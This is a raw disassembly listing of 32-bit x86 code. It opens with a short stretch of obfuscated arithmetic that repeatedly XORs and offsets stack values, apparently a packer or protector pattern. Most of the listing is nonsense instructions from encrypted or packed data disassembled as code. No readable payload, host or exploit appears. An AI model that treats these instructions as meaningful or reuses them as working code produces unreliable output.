  421c89:	mov    BYTE PTR [eax],cl
  421c8b:	mov    eax,DWORD PTR [ebp-0x10c]
  421c91:	sub    eax,0x3272fb
  421c96:	xor    eax,0x75108b5
  421c9b:	cmp    eax,DWORD PTR [ebp-0x118]
  421ca1:	jne    0x421cfe
  421ca7:	mov    eax,DWORD PTR [ebp-0x104]
  421cad:	xor    eax,0x75108b5
  421cb2:	add    eax,0x3272fb
  421cb7:	mov    ecx,DWORD PTR [ebp-0x11c]
  421cbd:	xor    ecx,0x75108b5
  421cc3:	add    ecx,0x3272fb
  421cc9:	sub    eax,ecx
  421ccb:	sub    eax,0x3272fb
  421cd0:	xor    eax,0x75108b5
  421cd5:	mov    DWORD PTR [ebp-0x104],eax
  421cdb:	mov    eax,DWORD PTR [ebp-0x11c]
  421ce1:	xor    eax,0x75108b5
  421ce6:	add    eax,0x3272fb
  421ceb:	mov    ecx,DWORD PTR [ebp-0x13c]
  421cf1:	sub    ecx,eax
  421cf3:	mov    DWORD PTR [ebp-0x10c],ecx
  421cf9:	jmp    0x421d1c
  421cfe:	mov    eax,DWORD PTR [ebp-0x11c]
  421d04:	xor    eax,0x75108b5
  421d09:	add    eax,0x3272fb
  421d0e:	mov    ecx,DWORD PTR [ebp-0x10c]
  421d14:	sub    ecx,eax
  421d16:	mov    DWORD PTR [ebp-0x10c],ecx
  421d1c:	jmp    0x41afe6
  421d21:	mov    eax,DWORD PTR [ebp+0x8]
  421d24:	jmp    0x4240ca
  421d29:	mov    eax,ds:0x66e06a5
  421d2e:	ins    BYTE PTR es:[edi],dx
  421d2f:	icebp  
  421d30:	je     0x421cd7
  421d32:	pop    ebx
  421d33:	rol    BYTE PTR gs:[ecx],cl
  421d36:	pop    esi
  421d37:	sbb    al,0x98
  421d39:	pop    ebp
  421d3a:	inc    eax
  421d3b:	jp     0x421db8
  421d3d:	add    bl,BYTE PTR [eax-0x2b058485]
  421d43:	out    0xcc,eax
  421d45:	enter  0xbaf5,0xf6
  421d49:	stc    
  421d4a:	fst    st(1)
  421d4c:	rcr    esi,cl
  421d4e:	rcr    edi,0xc7
  421d51:	(bad)  
  421d52:	in     eax,0xf5
  421d54:	fcmovu st,st(7)
  421d56:	fld    DWORD PTR ds:0xc1e1ea0f
  421d5c:	fdivrp st(7),st
  421d5e:	leave  
  421d5f:	iret   
  421d60:	jmp    0x421d33
  421d62:	in     al,0xe0
  421d64:	rcl    bl,0xf8
  421d67:	leave  
  421d68:	repz iret 
  421d6a:	int3   
  421d6b:	xlat   BYTE PTR ds:[ebx]
  421d6c:	dec    edi
  421d6e:	ret    0xc5e6
  421d71:	add    al,0x6
  421d73:	aad    0x4
  421d75:	retf   0xe4dd
  421d78:	fmul   st,st(0)
  421d7a:	call   0xe60ecc4a
  421d7f:	shl    dl,1
  421d81:	(bad)  
  421d82:	call   0xad07fd50
  421d87:	aam    0xbb
  421d89:	repz fnstsw WORD PTR [ecx-0x18401033]
  421d90:	mul    eax
  421d92:	std    
  421d93:	shr    ebx,1
  421d95:	add    esi,esi
  421d97:	or     bh,bl
  421d99:	retf   
  421d9a:	or     al,0xbd
  421d9c:	enter  0xa4ae,0xd7
  421da0:	fsubr  st(6),st
  421da2:	aam    0xce
  421da4:	jmp    FWORD PTR [ebp-0x1c2b263a]
  421daa:	add    ebp,ecx
  421dac:	stc    
  421dad:	mov    ecx,0xf4f2c2be
  421db2:	or     ebp,edi
  421db4:	leave  
  421db5:	(bad)  
  421db6:	fisttp QWORD PTR [esi]
  421db8:	movlps xmm0,QWORD PTR [edx]
  421dbb:	repnz iret 
  421dbd:	test   al,0xbd
  421dbf:	rol    esi,1
  421dc1:	shr    bh,0xfa
  421dc4:	out    dx,al
  421dc5:	mov    dh,0xc4
  421dc7:	xlat   BYTE PTR ds:[ebx]
  421dc8:	ror    esp,1
  421dca:	call   0xf331ec90
  421dcf:	push   es
  421dd0:	(bad)  
  421dd1:	mov    ebp,0xcbf7f7c5
  421dd6:	push   es
  421dd7:	(bad)  
  421dd8:	in     al,dx
  421dd9:	int3   
  421dda:	jecxz  0x421db4
  421ddc:	loop   0x421dd5
  421dde:	ror    bh,1
  421de0:	loope  0x421dcf
  421de2:	retf   0xcfd6
  421de5:	call   0xcdff12d8
  421dea:	iret   
  421deb:	hlt    
  421dec:	rcl    dh,0xd8
  421def:	repz loop 0x421df1
  421df2:	mov    eax,0x4da04e5
  421df7:	leave  
  421df8:	int3   
  421df9:	vcmppd ymm5,ymm6,YMMWORD PTR [edi-0xa483f38],0xc3
  421e02:	int    0xd3
  421e04:	in     al,dx
  421e05:	mov    edi,0xcbf3fae9
  421e0a:	ror    esi,cl
  421e0c:	ret    0x506
  421e0f:	out    0xe4,eax
  421e11:	div    bh
  421e13:	or     edx,eax
  421e15:	loopne 0x421e0f
  421e17:	(bad)  
  421e18:	stc    
  421e19:	out    0xce,al
  421e1b:	enter  0xc7b3,0xac
  421e1f:	shr    edx,0xfa
  421e22:	ror    dl,0xe7
  421e25:	mov    eax,0xbeead1c9
  421e2a:	mov    ecx,0xdeb9ddd4
  421e2f:	out    0xdc,al
  421e31:	mov    ecx,0xf708f1e1
  421e36:	call   esp
  421e38:	jmp    0xab360d15
  421e3d:	rol    bl,cl
  421e3f:	into   
  421e40:	into   
  421e41:	ret    0xedd4
  421e44:	sti    
  421e45:	mov    dh,0xd1
  421e47:	cld    
  421e48:	call   ecx
  421e4a:	mov    esi,0xc7ecf2f6
  421e4f:	rcl    ecx,cl
  421e51:	(bad)  
  421e52:	imul   ebx
  421e54:	aam    0xe
  421e56:	sti    
  421e57:	call   0xa92e245e
  421e5c:	fistp  QWORD PTR [esi-0xa285409]
  421e62:	mov    dh,0xcc
  421e64:	out    0xfe,al
  421e66:	retf   0xfbd5
  421e69:	(bad)  
  421e6b:	loopne 0x421e4f
  421e6d:	test   esi,0xc4d4dbf7
  421e73:	(bad)  
  421e74:	loopne 0x421e75
  421e76:	in     al,0xe8
  421e78:	dec    DWORD PTR [eax]
  421e7a:	push   es
  421e7b:	out    dx,al
  421e7c:	mov    edi,0xdcd0eed0
  421e81:	rcl    ebp,1
  421e83:	into   
  421e84:	cli    
  421e85:	fcmove st,st(0)
  421e87:	int3   
  421e88:	mov    ebp,0xe1f4c9fb
  421e8d:	out    dx,al
  421e8e:	loope  0x421e93
  421e90:	(bad)  
  421e91:	(bad)  
  421e93:	rol    al,1
  421e95:	cld    
  421e96:	cld    
  421e97:	retf   
  421e98:	(bad)  
  421e9a:	jecxz  0x421e75
  421e9c:	mov    al,0xce
  421e9e:	mov    esi,0xc8cbeced
  421ea3:	mov    ah,0xea
  421ea5:	(bad)  
  421ea6:	in     eax,dx
  421ea7:	shr    edi,1
  421ea9:	fadd   st(2),st
  421eab:	mov    esi,0xf6d5d3ef
  421eb0:	fld    DWORD PTR [ebx]
  421eb2:	mov    esp,0xc9dbfac2
  421eb7:	in     eax,dx
  421eb8:	fcom   DWORD PTR [ebx]
  421eba:	add    al,0xc3
  421ebc:	retf   
  421ebd:	loopne 0x421ead
  421ebf:	(bad)
  421ec2:	jmp    0xd9bf:0xeffbe4c0
  421ec9:	lock jecxz 0x421ecf
  421ecc:	rol    al,0xf0
  421ecf:	in     eax,0xbc
  421ed1:	hlt    
  421ed2:	add    eax,0xd9d9d5c0
  421ed7:	add    ebx,esp
  421ed9:	int    0xc9
  421edb:	iret   
  421edc:	in     eax,0xf6
  421ede:	repz ret 
  421ee0:	lock sti 
  421ee2:	fcomi  st,st(5)
  421ee4:	fxam   
  421ee6:	jmp    0x421eb4
  421ee8:	fldpi  
  421eea:	out    dx,eax
  421eeb:	(bad)  
  421eed:	aam    0xb4
  421eef:	mov    edi,0x4e7d7de
  421ef4:	(bad)  
  421ef7:	(bad)  
  421ef8:	fsubr  st(6),st
  421efa:	repnz leave 
  421efc:	imul   ebp
  421efe:	in     al,dx
  421eff:	lods   eax,DWORD PTR ds:[esi]
  421f00:	(bad)  
  421f01:	iret   
  421f02:	mov    edx,0xfdadf3ea
  421f07:	xlat   BYTE PTR ds:[ebx]
  421f08:	xlat   BYTE PTR ds:[ebx]
  421f09:	jmp    0x1fe:0xdbcdb7b8
  421f10:	jecxz  0x421efd
  421f12:	or     edi,esi
  421f14:	loop   0x421edc
  421f16:	enter  0xcbef,0xf
  421f1a:	std    
  421f1b:	mov    ecx,0xc6e3f2bd
  421f20:	(bad)  
  421f21:	retf   0xf7d9
  421f24:	cli    
  421f25:	(bad)  
  421f26:	out    dx,al
  421f27:	mov    ebp,0xbad7c903
  421f2c:	in     al,dx
  421f2d:	jecxz  0x421f36
  421f2f:	shl    dl,0xe4
  421f32:	in     eax,0xf9
  421f34:	cli    
  421f35:	(bad)  [edx]
  421f37:	jmp    0x421f21
  421f39:	iret   
  421f3a:	call   0xa9190529
  421f3f:	aam    0xd7
  421f41:	leave  
  421f42:	mov    ch,0xf8
  421f44:	cli    
  421f45:	repz mov al,0xef
  421f48:	jmp    0xe6e1:0xdcbde3ce
  421f4f:	loop   0x421f2b
  421f51:	hlt    
  421f52:	add    eax,DWORD PTR [edx]
  421f54:	or     bl,bh
  421f56:	cmc    
  421f57:	in     eax,dx
  421f58:	fcmovu st,st(6)
  421f5a:	adc    ch,ah
  421f5c:	jmp    0xe72ffc3e
  421f61:	mov    al,0xf2
  421f64:	repz mov al,0xb6
  421f67:	in     al,dx
  421f68:	int3   
  421f69:	repnz iret 
  421f6b:	icebp  
  421f6c:	hlt    
  421f6d:	fcom   st(3)
  421f6f:	sar    dh,cl
  421f71:	dec    edx
  421f73:	shl    edi,0xd7
  421f76:	mov    esp,0xdddff90c
  421f7b:	mov    esp,0xc3e0eef2
  421f80:	(bad)
  421f83:	fld    st(6)
  421f85:	fmul   st,st(6)
  421f87:	cld    
  421f88:	rcl    edx,1
  421f8a:	idiv   ah
  421f8c:	hlt    
  421f8d:	out    dx,eax
  421f8e:	fadd   st(2),st
  421f90:	lock (bad) 
  421f92:	loope  0x421f5a
  421f94:	pop    es
  421f95:	iret   
  421f96:	push   cs
  421f97:	out    dx,eax
  421f98:	out    dx,eax
  421f99:	loop   0x421f85
  421f9b:	ret    
  421f9c:	test   al,0xe6
  421f9e:	fst    st(6)
  421fa0:	mov    bh,0xe5
  421fa2:	sar    ecx,1
  421fa4:	(bad)  
  421fa6:	out    0xfe,al
  421fa8:	(bad)  
  421fa9:	jmp    0xe210f2a7
  421fae:	bnd ret 0xdad2
  421fb2:	(bad)  
  421fb4:	add    esi,edi
  421fb6:	vpaddb ymm4,ymm5,ymm3
  421fba:	out    dx,al
  421fbb:	(bad)  
  421fbc:	int    0xdf
  421fbe:	test   al,0xf6
  421fc0:	jmp    0x421fab
  421fc2:	loope  0x421fa4
  421fc4:	(bad)  
  421fc5:	call   0xf10c10ae
  421fca:	mov    esi,0xc1d8f6d6
  421fcf:	loop   0x421fab
  421fd1:	fmul   DWORD PTR [ebx]
  421fd3:	(bad)  
  421fd4:	xlat   BYTE PTR ds:[ebx]
  421fd5:	or     ebx,ebp
  421fd7:	(bad)  
  421fd8:	iret   
  421fd9:	push   cs
  421fda:	(bad)  
  421fdb:	test   eax,0xb0c5afcd
  421fe0:	scas   al,BYTE PTR es:[edi]
  421fe1:	loop   0x421fd1
  421fe3:	repnz out dx,eax
  421fe5:	call   0xca1b11c0
  421fea:	xlat   BYTE PTR ds:[ebx]
  421feb:	ret    0xe3e2
  421fee:	out    0xd2,al
  421ff0:	(bad)  
  421ff1:	ret    
  421ff2:	mov    esp,0xd6f9fbde
  421ff7:	add    eax,0xcc09fdcc
  421ffc:	out    dx,eax
  421ffd:	ror    eax,cl
  421fff:	icebp  
  422000:	(bad)  
  422001:	cli    
  422002:	cmc    
  422003:	int3   
  422004:	mov    dh,0xb0
  422006:	shl    ebx,1
  422008:	sti    
  422009:	icebp  
  42200a:	fcmovb st,st(3)
  42200c:	ret    0xf0d7
  42200f:	in     eax,dx
  422010:	cmc    
  422011:	out    0x0,eax
  422013:	cld    
  422014:	(bad)  
  422015:	bswap  ecx
  422017:	out    0xfe,al
  422019:	push   es
  42201a:	loope  0x421fff
  42201c:	out    0xcc,al
  42201e:	mov    esi,0xefd3e7cb
  422023:	in     al,dx
  422024:	call   ebx
  422026:	retf   
  422027:	(bad)  
  422028:	cld    
  422029:	mov    ch,0xbf
  42202b:	out    dx,eax
  42202c:	ret    
  42202d:	mov    eax,0xf8ebbddf
  422032:	loopne 0x42200b
  422034:	retf   0xc0c1
  422037:	or     eax,0xb100dbed
  42203c:	(bad)  [ebp-0x84e1243]
  422042:	icebp  
  422043:	enter  0xc7b7,0xfe
  422047:	in     eax,0xeb
  422049:	mov    ch,0xf9
  42204b:	sar    DWORD PTR [edi+edi*4-0x29410f09],1
  422052:	icebp  
  422053:	ret    
  422054:	push   es
  422055:	jmp    0x422034
  422057:	loop   0x42201d
  422059:	repz jmp 0x422018
  42205c:	jmp    0xc2e8:0xd2e8d6ca
  422063:	call   0xf12ed118
  422068:	mov    ch,0xda
  42206a:	std    
  42206b:	icebp  
  42206c:	ret    
  42206d:	sti    
  42206e:	hlt    
  42206f:	cli    
  422070:	aam    0xda
  422072:	add    ecx,ecx
  422074:	loop   0x422079
  422076:	(bad)  
  422077:	cld    
  422078:	add    BYTE PTR [esi],al
  42207a:	push   es
  42207b:	lock test eax,0xf7cfd5e8
  422081:	int    0xfa
  422083:	fdivr  st,st(3)
  422085:	mov    ch,0xe9
  422087:	(bad)  
  422089:	rol    BYTE PTR [ecx],cl
  42208b:	(bad)  
  42208d:	(bad)  
  42208f:	out    0xf8,eax
  422091:	mov    esp,0x4d0dcf6
  422096:	in     eax,dx
  422097:	into   
  422098:	paddsw mm4,mm5
  42209b:	shr    BYTE PTR [edi-0x2c310833],cl
  4220a1:	xlat   BYTE PTR ds:[ebx]
  4220a2:	out    0xc6,al
  4220a4:	ror    edx,cl
  4220a6:	in     eax,0xf8
  4220a8:	(bad)  
  4220aa:	repnz mov ebp,0x2f3bfee
  4220b0:	fcmovnu st,st(7)
  4220b2:	push   edi
  4220b4:	dec    ecx
  4220b6:	out    dx,al
  4220b7:	psrad  mm4,mm6
  4220ba:	(bad)  
  4220bc:	scas   eax,DWORD PTR es:[edi]
  4220bd:	loopne 0x42209c
  4220bf:	shl    dl,0xd1
  4220c2:	sti    
  4220c3:	int3   
  4220c4:	in     al,dx
  4220c5:	enter  0xd0fa,0xeb
  4220c9:	jmp    0x4220b9
  4220cb:	xlat   BYTE PTR ds:[ebx]
  4220cc:	mov    edx,0xd2ddd2dc
  4220d1:	(bad)  
  4220d3:	push   es
  4220d4:	loop   0x4220b4
  4220d6:	test   dh,0xf
  4220d9:	std    
  4220da:	in     eax,0xad
  4220dc:	enter  0xb0d7,0xc8
  4220e0:	rcl    edx,cl
  4220e2:	shl    BYTE PTR [edx-0x3122082b],1
  4220e8:	mov    ah,0xd8
  4220ea:	out    dx,eax
  4220eb:	add    esi,ecx
  4220ed:	stc    
  4220ee:	add    DWORD PTR [esi-0x30009fa],edi
  4220f4:	in     al,0xef
  4220f6:	add    dh,ah
  4220f8:	or     eax,0xaed90ed9
  4220fd:	(bad)
  422101:	aam    0xfb
  422103:	mov    bh,0xb5
  422105:	mov    dh,0xd0
  422107:	retf   0xeffa
  42210a:	rcl    ecx,cl
  42210c:	mov    edi,0xc3d103fc
  422111:	add    DWORD PTR [edx],eax
  422113:	lock aad 0xbd
  422116:	hlt    
  422117:	sti    
  422118:	hlt    
  422119:	out    dx,eax
  42211a:	clc    
  42211b:	leave  
  42211c:	xlat   BYTE PTR ds:[ebx]
  42211d:	lock ret 0xb0e3
  422121:	(bad)  
  422122:	cmc    
  422123:	scas   eax,DWORD PTR es:[edi]
  422124:	cmc    
  422125:	(bad)  
  422127:	in     al,dx
  422128:	rcr    esi,1
  42212a:	mov    ebx,0xf4cfddc8
  42212f:	vpinsrw xmm3,xmm0,esp,0xc4
  422134:	hlt    
  422135:	rol    ch,0xd4
  422138:	(bad)
  42213b:	shr    eax,0xc1
  42213e:	(bad)
  422141:	aam    0xf9
  422143:	in     al,0xcd
  422145:	rcl    esi,1
  422147:	mov    eax,0xf2d3dcd2
  42214c:	fcmovnbe st,st(3)
  42214e:	out    dx,al
  42214f:	fdivp  st(1),st
  422151:	add    eax,0xd7ddf7f8
  422156:	loopne 0x422131
  422158:	leave  
  422159:	or     al,0xe6
  42215b:	scas   eax,DWORD PTR es:[edi]
  42215c:	in     al,dx
  42215d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42215e:	in     eax,dx
  42215f:	neg    bl
  422161:	mov    al,0xe1
  422163:	lock cmc 
  422165:	jmp    0xbefd1f49
  42216a:	(bad)  
  42216b:	jmp    eax
  42216d:	mov    esi,0x505bbd6
  422172:	cld    
  422173:	call   0xe1261d59
  422178:	(bad)  
  42217a:	adc    ebp,ebx
  42217c:	ret    0xc1d3
  42217f:	mov    bh,0xee
  422181:	enter  0xd5d3,0xfb
  422185:	(bad)
  422189:	(bad)  
  42218b:	fucom  st(7)
  42218d:	mov    ebp,0xb9cc07f9
  422192:	test   ebp,0xd4dc01d6
  422198:	ret    0xe5ec
  42219b:	mov    ecx,0xf3e4b1af
  4221a0:	mov    bl,0xcc
  4221a2:	shr    dl,1
  4221a4:	scas   al,BYTE PTR es:[edi]
  4221a5:	leave  
  4221a6:	(bad)  
  4221a8:	fdivr  st(2),st
  4221aa:	add    al,BYTE PTR [ecx]
  4221ac:	sti    
  4221ad:	rol    BYTE PTR [edx],0xde
  4221b0:	ret    0x5d8
  4221b3:	jecxz  0x4221ab
  4221b5:	fmulp  st(1),st
  4221b7:	jmp    0xf3ef:0xf100eee8
  4221be:	out    dx,al
  4221bf:	ret    
  4221c0:	scas   al,BYTE PTR es:[edi]
  4221c1:	(bad)  
  4221c2:	stc    
  4221c3:	out    dx,al
  4221c4:	in     al,0xd1
  4221c6:	mov    edi,0xefefdbd6
  4221cb:	iret   
  4221cc:	int3   
  4221cd:	ret    
  4221ce:	clc    
  4221cf:	faddp  st(3),st
  4221d1:	clc    
  4221d2:	xlat   BYTE PTR ds:[ebx]
  4221d3:	call   0xe14211b9
  4221d8:	or     eax,0xdfd00dfa
  4221dd:	out    dx,eax
  4221de:	mov    esp,0xfbc2c4cb
  4221e3:	out    dx,eax
  4221e4:	int    0xf4
  4221e6:	stc    
  4221e7:	jmp    0xbe24efb6
  4221ec:	iret   
  4221ed:	fmul   st,st(4)
  4221ef:	(bad)  
  4221f0:	hlt    
  4221f1:	(bad)  
  4221f2:	cli    
  4221f3:	call   0xc93e26c0
  4221f8:	fist   WORD PTR [ebx]
  4221fa:	int3   
  4221fb:	(bad)
  4221ff:	mov    ebp,0xd6c1d2d7
  422204:	into   
  422205:	shl    DWORD PTR [eax-0x2c3c4727],1
  42220b:	in     eax,dx
  42220c:	mov    ebp,0xdbd603bd
  422211:	rcr    cl,0xe1
  422214:	add    al,0xb
  422216:	into   
  422217:	jmp    0x422220
  422219:	out    0xd8,al
  42221b:	bnd ret 0xd1f2
  42221f:	fadd   st(5),st
  422221:	jmp    0x4221d5
  422223:	fldcw  WORD PTR [esi-0x2d2b444f]
  422229:	in     eax,dx
  42222a:	ret    
  42222b:	shl    cl,cl
  42222d:	sti    
  42222e:	add    DWORD PTR ds:0x5dbf307,eax
  422234:	xlat   BYTE PTR ds:[ebx]
  422235:	(bad)  
  422236:	enter  0xf3d5,0xff
  42223a:	in     eax,0xe4
  42223c:	lock leave 
  42223e:	test   al,0xcf
  422240:	loop   0x422209
  422242:	shl    ch,0xe4
  422245:	sti    
  422246:	cli    
  422247:	int    0xba
  422249:	shl    dl,1
  42224b:	fst    st(6)
  42224d:	int    0xf0
  42224f:	add    esi,ebp
  422251:	loope  0x422233
  422253:	ror    BYTE PTR [edx],0xc6
  422256:	clc    
  422257:	iret   
  422258:	retf   
  422259:	adc    al,BYTE PTR [eax]
  42225b:	icebp  
  42225c:	mov    edi,0xe6d4d6dd
  422261:	(bad)  
  422262:	repnz stc 
  422264:	jmp    0xe8e9:0xf0dff7d0
  42226b:	aam    0xd1
  42226d:	int    0xbc
  42226f:	jecxz  0x422241
  422271:	fdivp  st(6),st
  422273:	add    eax,ebx
  422275:	or     al,BYTE PTR [ecx]
  422277:	fmul   QWORD PTR [esi]
  422279:	add    ch,dl
  42227b:	loope  0x42223d
  42227d:	loope  0x42222f
  42227f:	(bad)  
  422281:	int    0xec
  422283:	mov    al,0xef
  422285:	div    BYTE PTR [esi-0x152a143c]
  42228b:	mov    ebx,0x4c3dcde
  422290:	fdivr  st(6),st
  422292:	add    ch,dh
  422294:	std    
  422295:	cli    
  422296:	loope  0x4222a0
  422298:	or     al,0xdb
  42229a:	in     eax,dx
  42229b:	loop   0x42228d
  42229d:	enter  0xf7b2,0xfb
  4222a1:	cmc    
  4222a2:	(bad)  
  4222a4:	out    0xf2,eax
  4222a6:	iret   
  4222a7:	mov    esi,0xe8f1d2bc
  4222ac:	add    dh,cl
  4222ae:	mov    edi,0x5f4f7f9
  4222b3:	or     esp,edi
  4222b5:	fcmove st,st(7)
  4222b7:	aad    0xf8
  4222b9:	pinsrw mm3,ebp,0xea
  4222bd:	mov    ebp,0xd3ecb0d3
  4222c2:	jmp    0xde2fdd91
  4222c7:	stc    
  4222c8:	(bad)  
  4222ca:	(bad)  
  4222cc:	ret    
  4222cd:	fdivrp st(1),st
  4222cf:	cli    
  4222d0:	loope  0x4222a3
  4222d2:	clc    
  4222d3:	cld    
  4222d4:	push   es
  4222d5:	enter  0x904,0xe4
  4222d9:	int3   
  4222da:	jmp    0x4222a4
  4222dc:	mov    esp,0xe2abc1df
  4222e1:	jmp    0xecb8:0xebeab7e5
  4222e8:	int3   
  4222e9:	mov    cl,0xf9
  4222eb:	mov    ebp,0xec06edf5
  4222f0:	test   DWORD PTR [esi],0xe0c8f9b8
  4222f6:	(bad)  
  4222f7:	or     dh,cl
  4222f9:	loopne 0x42230e
  4222fb:	in     al,0xd7
  4222fd:	(bad)
  422300:	mov    bl,0xf3
  422302:	in     eax,dx
  422303:	out    dx,eax
  422304:	mov    cl,0xb9
  422306:	mul    ebp
  422308:	retf   0xf8fb
  42230b:	(bad)  
  42230d:	cld    
  42230e:	int3   
  42230f:	not    ah
  422311:	retf   
  422312:	loope  0x4222d5
  422314:	add    ecx,DWORD PTR [ebx]
  422316:	or     eax,0xc8dbebea
  42231b:	out    0xeb,eax
  42231d:	lods   eax,DWORD PTR ds:[esi]
  42231e:	ror    ebx,0xd3
  422321:	xlat   BYTE PTR ds:[ebx]
  422322:	out    0xb4,al
  422324:	lock jmp 0xd7d9:0xddd1febb
  42232c:	cld    
  42232d:	rcr    ebp,cl
  42232f:	(bad)  
  422330:	(bad)
  422333:	in     eax,0xf8
  422335:	ror    edi,0xef
  422338:	add    ecx,DWORD PTR [eax]
  42233a:	jmp    0xc9eace27
  42233f:	test   dl,0xd7
  422342:	mov    dh,0xf7
  422344:	in     eax,0xc8
  422346:	mov    ch,0xcc
  422348:	in     eax,dx
  422349:	call   0xc1031c2d
  42234e:	mov    ebp,0xe5c1c5da
  422353:	loopne 0x42231a
  422355:	std    
  422356:	leave  
  422357:	dec    BYTE PTR [eax]
  422359:	repnz (bad) 
  42235b:	jmp    0xb0ca:0xe5a8b2c1
  422362:	lds    esi,FWORD PTR [esi-0x10402e21]
  422368:	mov    ecx,0xcddfeebf
  42236d:	fidivr WORD PTR [esi-0x2a273905]
  422373:	leave  
  422374:	add    eax,0xe10ed6c6
  422379:	shr    eax,0xcc
  42237c:	stos   BYTE PTR es:[edi],al
  42237d:	shl    cl,0xc5
  422380:	repz jmp 0x42234b
  422383:	fxch   st(0)
  422385:	fadd   st,st(5)
  422387:	stc    
  422388:	cli    
  422389:	xlat   BYTE PTR ds:[ebx]
  42238a:	ret    
  42238b:	rol    BYTE PTR [ecx],1
  42238d:	sar    BYTE PTR [edi-0x8f4fb02],cl
  422393:	jmp    0x42239d
  422395:	add    ebp,edx
  422397:	in     eax,dx
  422398:	(bad)  
  422399:	or     eax,DWORD PTR [ecx]
  42239b:	int    0xee
  42239d:	loope  0x422367
  42239f:	lock fld TBYTE PTR [ecx-0x34002e1f]
  4223a6:	aam    0xce
  4223a8:	cli    
  4223a9:	add    ebx,eax
  4223ab:	ret    0xf3f6
  4223ae:	fmul   st(5),st
  4223b0:	mov    esi,0xc2e0e9e0
  4223b5:	(bad)  
  4223b6:	fsubr  st(3),st
  4223b8:	in     eax,0xea
  4223ba:	jmp    0xb333ed7c
  4223bf:	retf   0xfafb
  4223c2:	out    0xe0,eax
  4223c4:	mov    ah,0xb5
  4223c6:	int3   
  4223c7:	jmp    0xf225f696
  4223cc:	fxtract 
  4223ce:	fadd   QWORD PTR [ebx]
  4223d0:	(bad)  
  4223d2:	repnz retf 0xd9e8
  4223d6:	out    0x3,eax
  4223d8:	retf   
  4223d9:	adc    ebx,ecx
  4223db:	shl    ch,1
  4223dd:	test   eax,0xc0d6b6b1
  4223e2:	leave  
  4223e3:	shr    eax,cl
  4223e5:	vpaddusb ymm3,ymm1,ymm0
  4223e9:	stc    
  4223ea:	mov    ecx,0xdcfcf0f0
  4223ef:	icebp  
  4223f0:	div    ch
  4223f2:	(bad)  
  4223f3:	or     esp,eax
  4223f5:	aam    0xd9
  4223f7:	hlt    
  4223f8:	push   es
  4223f9:	or     dh,ah
  4223fb:	(bad)  
  4223fc:	stos   BYTE PTR es:[edi],al
  4223fd:	test   eax,0xf2cceecd
  422402:	fldz   
  422404:	mov    ecx,0xf7d2cff7
  422409:	mov    eax,0x1dcc9b4
  42240e:	std    
  42240f:	aad    0x3
  422411:	loope  0x4223f7
  422413:	(bad)  
  422415:	shufps xmm1,xmm0,0xf4
  422419:	into   
  42241a:	icebp  
  42241b:	leave  
  42241c:	shr    edx,cl
  42241e:	into   
  42241f:	int3   
  422420:	rol    al,0xf5
  422423:	leave  
  422424:	(bad)  
  422426:	lds    esi,FWORD PTR [ebp-0x41330721]
  42242c:	ret    0x5fe
  42242f:	(bad)  
  422431:	aam    0xa
  422433:	lock loope 0x42242d
  422436:	fxch   st(2)
  422438:	add    ebx,edi
  42243a:	or     dh,bl
  42243c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42243d:	ret    
  42243e:	mov    esi,0xc9b0e1d2
  422443:	clc    
  422444:	(bad)  
  422445:	aad    0xd6
  422447:	shr    eax,cl
  422449:	mov    esi,0xdad9dff7
  42244e:	hlt    
  42244f:	add    eax,0xc9e1d406
  422454:	in     al,0xd6
  422456:	(bad)  
  422458:	in     eax,0x8
  42245a:	or     bl,dl
  42245c:	stos   BYTE PTR es:[edi],al
  42245d:	retf   
  42245e:	out    0xc4,eax
  422460:	lods   al,BYTE PTR ds:[esi]
  422461:	int3   
  422462:	bnd call 0xfb1cfa5c
  422468:	in     al,0xb5
  42246a:	lock rol BYTE PTR [ecx],cl
  42246d:	repnz int 0xf5
  422470:	sti    
  422471:	fcmovu st,st(6)
  422473:	add    al,0xf7
  422475:	push   cs
  422476:	aad    0xdf
  422478:	aam    0xff
  42247a:	int3   
  42247b:	leave  
  42247c:	out    0xb0,eax
  42247e:	scas   eax,DWORD PTR es:[edi]
  42247f:	mov    ebp,0xb3e0f4eb
  422484:	retf   0xbbcb
  422487:	mov    ebp,0x3d8ddd2
  42248c:	cmc    
  42248d:	loopne 0x42246f
  42248f:	std    
  422490:	(bad)  
  422491:	cmc    
  422492:	in     al,0xc1
  422494:	rcr    bl,0xff
  422497:	jecxz  0x422478
  422499:	in     eax,0x8
  42249b:	(bad)  
  42249c:	rol    ebx,cl
  42249e:	mov    esp,0xcbf1eceb
  4224a3:	jmp    0x422465
  4224a5:	into   
  4224a6:	mov    ecx,0xf4cfcab8
  4224ab:	loop   0x4224ae
  4224ad:	loope  0x422488
  4224af:	add    dl,cl
  4224b1:	clc    
  4224b2:	out    0xc4,al
  4224b4:	cld    
  4224b5:	in     al,0xdd
  4224b7:	add    esp,esi
  4224b9:	jmp    0x4224c6
  4224bb:	mov    cl,0xcd
  4224bd:	mov    ebp,0xc7c2d0ad
  4224c2:	mov    dh,0xcd
  4224c4:	in     al,0xb1
  4224c6:	fldln2 
  4224c8:	sar    esi,1
  4224ca:	repz fdivr st,st(7)
  4224cd:	aam    0xf8
  4224cf:	add    dl,bh
  4224d1:	cld    
  4224d2:	loope  0x4224d7
  4224d4:	lock add dl,bh
  4224d7:	jmp    0xf02336e0
  4224dc:	(bad)  
  4224dd:	lock lods al,BYTE PTR ds:[esi]
  4224df:	into   
  4224e0:	int    0xb0
  4224e2:	in     eax,0xb3
  4224e4:	shr    bh,cl
  4224e6:	mov    bh,0xf1
  4224e8:	mov    ah,0xd6
  4224ea:	into   
  4224eb:	fcmove st,st(0)
  4224ed:	cli    
  4224ee:	sar    DWORD PTR [eax+edx*8-0x1020221c],1
  4224f5:	enter  0xc503,0xcb
  4224f9:	or     ecx,ecx
  4224fb:	jmp    0xb431d6c9
  422500:	repnz cli 
  422502:	loopne 0x4224bd
  422504:	aad    0xb0
  422506:	(bad)  
  422507:	icebp  
  422508:	in     al,dx
  422509:	repz mov ah,0xff
  42250c:	mov    esi,0xfbdb05f4
  422511:	loope  0x42250a
  422513:	retf   
  422514:	rol    BYTE PTR ds:0xe7e30df6,0xea
  42251b:	icebp  
  42251c:	shr    BYTE PTR [edi-0x24552b09],0xc8
  422523:	sar    eax,cl
  422525:	iret   
  422526:	mov    dh,0xe4
  422528:	fdivr  st,st(2)
  42252a:	iret   
  42252b:	mov    ebx,0xcdf1d2ec
  422530:	rcr    ah,1
  422532:	add    edx,ecx
  422534:	loopne 0x42250a
  422536:	jmp    0x422526
  422538:	add    ebx,edi
  42253a:	add    ah,dl
